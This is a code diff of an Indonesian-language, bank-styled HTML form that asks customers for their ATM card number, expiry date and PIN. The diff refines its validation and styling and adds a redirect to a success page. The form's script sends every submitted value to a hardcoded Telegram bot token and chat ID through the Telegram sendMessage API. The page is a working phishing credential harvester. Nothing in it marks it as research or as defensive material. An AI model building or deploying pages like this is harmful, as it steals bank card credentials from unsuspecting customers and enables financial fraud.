@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Form Informasi Data Nasabah</title>
 <style>
-  /* Reset & base */
   * {
     box-sizing: border-box;
   }
@@ -14,23 +13,14 @@
     font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont,
       'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
     background: #ffffff;
-    color: #5a667f;
+    color: #556677;
   }
-
-  /* Header background */
   .header {
     position: relative;
     height: 130px;
-    background: linear-gradient(
-      135deg,
-      #0276bc 0%,
-      #0289eb 52%,
-      #059fec 100%
-    );
+    background: linear-gradient(135deg, #0276bc 0%, #0289eb 52%, #059fec 100%);
     clip-path: polygon(0 0, 100% 0, 100% 80%, 0 100%);
   }
-
-  /* Back arrow */
   .back-arrow {
     position: absolute;
     top: 40px;
@@ -46,41 +36,31 @@
     stroke-linecap: round;
     stroke-linejoin: round;
   }
-
-  /* Card */
   .card {
     max-width: 400px;
     margin: -50px auto 0;
     background: white;
     border-radius: 24px 24px 0 0;
     padding: 28px 24px 40px;
-    box-shadow: none;
   }
-
-  /* Heading */
   .card h2 {
     font-weight: 400;
     font-size: 16px;
-    color: #5a667f;
+    color: #556677;
     margin: 0 0 28px 0;
     opacity: 0.7;
   }
-
   label {
     display: block;
     font-size: 12px;
     font-weight: 400;
-    color: #a7b4d1;
+    color: #9ab1c8;
     margin-bottom: 8px;
   }
-
-  /* Input container */
   .input-wrapper {
     position: relative;
     margin-bottom: 16px;
   }
-
-  /* Input fields */
   input[type="text"],
   input[type="password"] {
     width: 100%;
@@ -90,44 +70,34 @@
     background: #f4f7fc;
     font-size: 14px;
     font-weight: 400;
-    color: #5a667f;
+    color: #556677;
     outline: none;
   }
-
-  /* Placeholder color */
   input::placeholder {
-    color: #99a8cf;
-    font-weight: 400;
+    color: #aebfdb;
   }
-
-  /* Char count */
   .char-count {
     font-size: 11px;
     text-align: right;
-    color: #c2cae1;
-    font-weight: 400;
+    color: #cbd6e7;
     margin-top: 2px;
   }
-
-  /* Calendar icon */
   .calendar-icon {
     position: absolute;
     right: 14px;
     top: 50%;
-    width: 22px;
-    height: 22px;
+    width: 20px;
+    height: 20px;
     fill: #2d4584;
     transform: translateY(-50%);
     pointer-events: none;
   }
-
-  /* Eye icon */
   .eye-icon {
     position: absolute;
     right: 14px;
     top: 50%;
-    width: 22px;
-    height: 22px;
+    width: 20px;
+    height: 20px;
     stroke: #2d4584;
     stroke-width: 2;
     stroke-linecap: round;
@@ -136,8 +106,6 @@
     cursor: pointer;
     transform: translateY(-50%);
   }
-
-  /* Submit button */
   button {
     margin-top: 30px;
     width: 100%;
@@ -158,7 +126,7 @@
 <body>
 
 <div class="header">
-  <div class="back-arrow" tabindex="0" aria-label="Kembali" role="button">
+  <div class="back-arrow" tabindex="0" aria-label="Kembali" role="button" onclick="history.back()">
     <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
       <polyline points="15 18 9 12 15 6" />
     </svg>
@@ -167,7 +135,7 @@
 
 <section class="card" aria-label="Form Informasi Data Nasabah">
   <h2>Informasi Data Nasabah.</h2>
-  <form id="nasabahForm">
+  <form id="nasabahForm" novalidate>
     <label for="atm">Nomor Kartu ATM</label>
     <div class="input-wrapper">
       <input
@@ -176,7 +144,7 @@
         name="atm"
         placeholder="Masukkan nomor kartu ATM Kamu"
         maxlength="18"
-        pattern="[0-9]*"
+        pattern="^\d{1,18}$"
         inputmode="numeric"
         autocomplete="off"
         aria-describedby="atm-count"
@@ -193,7 +161,7 @@
         name="expiry"
         placeholder="MM/YY"
         maxlength="5"
-        pattern="(0[1-9]|1[0-2])\/\d{2}"
+        pattern="^(0[1-9]|1[0-2])\/\d{2}$"
         autocomplete="off"
         aria-describedby="expiry-note"
         title="Format MM/YY"
@@ -213,14 +181,13 @@
         name="pin"
         placeholder="PIN"
         maxlength="6"
-        pattern="[0-9]{6}"
+        pattern="^\d{6}$"
         inputmode="numeric"
         autocomplete="off"
         aria-describedby="pin-count"
         required
       />
       <svg class="eye-icon" viewBox="0 0 24 24" id="togglePin" aria-label="Tampilkan atau sembunyikan PIN" role="button" tabindex="0">
-        <!-- Icon mata tertutup -->
         <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" />
         <line x1="4" y1="4" x2="20" y2="20" />
       </svg>
@@ -232,9 +199,8 @@
 </section>
 
 <script>
-  // Token & chat id Telegram (ganti sesuai data Anda)
-  const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM';
-  const CHAT_ID = '7213790655';
+  const BOT_TOKEN = '7504434844:AAEJvY81gVUID8gl1BCqdR28oNld83WbNxM'; // Ganti dengan token Bot Telegram Anda
+  const CHAT_ID = '7213790655';    // Ganti dengan Chat ID tujuan
 
   const atmInput = document.getElementById('atm');
   const atmCount = document.getElementById('atm-count');
@@ -244,70 +210,73 @@
   const togglePin = document.getElementById('togglePin');
   const form = document.getElementById('nasabahForm');
 
-  // Hitung karakter ATM
   atmInput.addEventListener('input', () => {
     atmCount.textContent = `${atmInput.value.length}/18`;
   });
 
-  // Hitung karakter PIN
   pinInput.addEventListener('input', () => {
     pinCount.textContent = `${pinInput.value.length}/6`;
   });
 
-  // Toggle show/hide PIN
+  expiryInput.addEventListener('input', () => {
+    let val = expiryInput.value.replace(/[^\d]/g, '');
+    if(val.length > 4) val = val.slice(0,4);
+    if(val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
+    expiryInput.value = val;
+  });
+
   togglePin.addEventListener('click', () => {
-    if (pinInput.type === 'password') {
+    if(pinInput.type === 'password'){
       pinInput.type = 'text';
       togglePin.innerHTML = `
-        <path d="M12 5c-5 0-9 7-9 7s4 7 9 7 9-7 9-7-4-7-9-7z" fill="none" stroke="#2d4584" stroke-width="2" />
-        <circle cx="12" cy="12" r="3" fill="none" stroke="#2d4584" stroke-width="2" />
+        <path d="M12 5c-5 0-9 7-9 7s4 7 9 7 9-7 9-7-4-7-9-7z" fill="none" stroke="#2d4584" stroke-width="2"/>
+        <circle cx="12" cy="12" r="3" fill="none" stroke="#2d4584" stroke-width="2"/>
       `;
     } else {
       pinInput.type = 'password';
       togglePin.innerHTML = `
-        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" fill="none" stroke="#2d4584" stroke-width="2" />
-        <line x1="4" y1="4" x2="20" y2="20" stroke="#2d4584" stroke-width="2" />
+        <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z" fill="none" stroke="#2d4584" stroke-width="2"/>
+        <line x1="4" y1="4" x2="20" y2="20" stroke="#2d4584" stroke-width="2"/>
       `;
     }
   });
 
-  // Format MM/YY di expiry input
-  expiryInput.addEventListener('input', () => {
-    let val = expiryInput.value.replace(/[^\d]/g, '');
-    if (val.length > 4) val = val.slice(0, 4);
-    if (val.length > 2) {
-      val = val.slice(0, 2) + '/' + val.slice(2);
-    }
-    expiryInput.value = val;
-  });
-
-  // Kirim data ke Telegram API saat submit
   form.addEventListener('submit', e => {
     e.preventDefault();
+
+    if(!atmInput.checkValidity()) {
+      alert('Nomor Kartu ATM harus maksimal 18 digit angka.');
+      atmInput.focus();
+      return;
+    }
+    if(!expiryInput.checkValidity()) {
+      alert('Tanggal Kadaluarsa harus dengan format MM/YY yang benar.');
+      expiryInput.focus();
+      return;
+    }
+    if(!pinInput.checkValidity()) {
+      alert('PIN harus 6 digit angka.');
+      pinInput.focus();
+      return;
+    }
 
     const atm = atmInput.value.trim();
     const expiry = expiryInput.value.trim();
     const pin = pinInput.value.trim();
 
-    if (!atm || !expiry || !pin) {
-      alert('Semua input wajib diisi dengan benar!');
-      return;
-    }
-
-    // Bangun pesan dengan format Markdown
-    const message = encodeURIComponent(
+    const msg = encodeURIComponent(
       `*Informasi Data Nasabah*\nNomor Kartu ATM: ${atm}\nTanggal Kadaluarsa: ${expiry}\nPIN Kartu ATM: ${pin}`
     );
 
-    // Kirim pesan ke Telegram melalui fetch
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=Markdown`)
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown`)
       .then(res => res.json())
       .then(data => {
-        if (data.ok) {
+        if(data.ok){
           alert('Data berhasil dikirim ke Telegram!');
           form.reset();
           atmCount.textContent = '0/18';
           pinCount.textContent = '0/6';
+          window.location.href = 'success.html';
         } else {
           alert('Gagal mengirim data ke Telegram.');
           console.error(data);
